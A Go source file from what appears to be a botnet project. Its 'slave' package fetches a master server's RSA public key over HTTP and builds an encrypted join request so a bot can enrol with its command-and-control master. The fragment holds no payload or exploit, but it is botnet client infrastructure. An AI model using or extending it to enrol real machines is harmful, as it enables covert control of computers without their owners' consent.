package slave

import (
	"crypto/rsa"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"

	"github.com/adrianosela/botnet/lib/encryption"
	"github.com/adrianosela/botnet/master"
)

func getMasterPubKey(masterAddr string) (*rsa.PublicKey, string, error) {
	req, err := http.NewRequest(http.MethodGet, fmt.Sprintf("http://%s%s", masterAddr, master.KeyEndpoint), nil)
	if err != nil {
		return nil, "", err
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, "", err
	}
	bodyBytes, err := ioutil.ReadAll(resp.Body)
	defer resp.Body.Close()
	if err != nil {
		return nil, "", err
	}
	var kr *master.KeyResponse
	if err := json.Unmarshal(bodyBytes, &kr); err != nil {
		return nil, "", err
	}
	pubKey, err := encryption.DecodePubKeyPEM([]byte(kr.Key))
	if err != nil {
		return nil, "", err
	}
	return pubKey, kr.Key, nil
}

func buildEncryptedJoinRequest(slavePubKey string, encryptionKey *rsa.PublicKey) (string, error) {
	encryptedRequest, err := json.Marshal(master.JoinRequest{Key: slavePubKey})
	if err != nil {
		return "", err
	}
	encrypted, err := encryption.EncryptMessage(encryptedRequest, encryptionKey)
	return string(encrypted), err
}
